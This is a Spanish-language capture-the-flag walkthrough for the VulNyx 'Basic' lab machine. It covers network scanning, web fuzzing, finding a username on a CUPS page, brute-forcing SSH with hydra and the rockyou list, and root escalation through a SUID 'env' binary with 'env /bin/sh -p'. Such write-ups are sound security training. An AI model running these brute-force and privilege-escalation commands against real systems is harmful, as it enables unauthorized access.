# Ejercicio Práctico Maquina Basic – Hacking Fuerza Bruta + Escalada de Privilegios Binarios SUID

Maquinas que vamos a utilizar Kali Linux y Basic [https://vulnyx.com/#basic](https://vulnyx.com/#basic)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2034.png)

```bash
ping -c 1 10.0.3.22 
```

![image.png](./imagenes/image%2035.png)

Es una maquina Linux.

```bash
nmap -p- -sS -sV -sC --open -min-rate=2000 -n -vvv -Pn 10.0.3.22
```

![image.png](./imagenes/image%2036.png)

`22/tcp  open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)`

`80/tcp  open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))`

`631/tcp open  ipp     syn-ack ttl 64 CUPS 2.3` **→ Servicio de impresoras en Linux**

- Miramos en el navegador web el puerto 80
    
    ![image.png](./imagenes/image%2037.png)
    

- Probamos a hacer fuzzing web con distintas herramientas.
    
    ```bash
    gobuster dir -u [http://10.0.3.22](./imagenes/http://10.0.3.22/) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    ```
    
    ![image.png](./imagenes/image%2038.png)
    
    ```bash
    dirb [http://10.0.3.22](./imagenes/http://10.0.3.22) 
    ```
    
    ![image.png](./imagenes/image%2039.png)
    

```bash
dirsearch -u http://10.0.3.22/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

![image.png](./imagenes/image%2040.png)

**No encontramos nada.**

- Enumeramos el **puerto 631**. Utilizando el navegador web,
    
    `http://10.0.3.22:631/`
    
    ![image.png](./imagenes/image%2041.png)
    

Miramos si encontramos algún nombre de usuario entre las pestañas.

![image.png](./imagenes/image%2042.png)

Hay lo tenemos un usuario llamado “**dimitri**”.

- Hemos visto en el escaneo de nmap que tenemos un puerto SSH.
- Vamos a hacerle un ataque de fuerza bruta con Hydra aprovechando que tenemos un posible nombre de usuario.
    
    ```bash
    hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.22 
    ```
    
    ![image.png](./imagenes/image%2043.png)
    
- Nos conectamos al SSH con las credenciales obtenidas.
    
    ```bash
    ssh dimitri@10.0.3.22  
    ```
    
    ![image.png](./imagenes/image%2044.png)
    
- Hacemos escalada de privilegios
    - Probamos con la enumeración de binarios SUID
        
        `find / -perm -4000 2>/dev/null`
        
        ![image.png](./imagenes/image%2045.png)
        

- Utilizamos la web de [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) para ayudarnos a identificar el binario vulnerable. En este caso `/usr/bin/env`.
    
    ![image.png](./imagenes/image%2046.png)
    
    `env /bin/sh -p`
    
    `whoami`
    
    ![image.png](./imagenes/image%2047.png)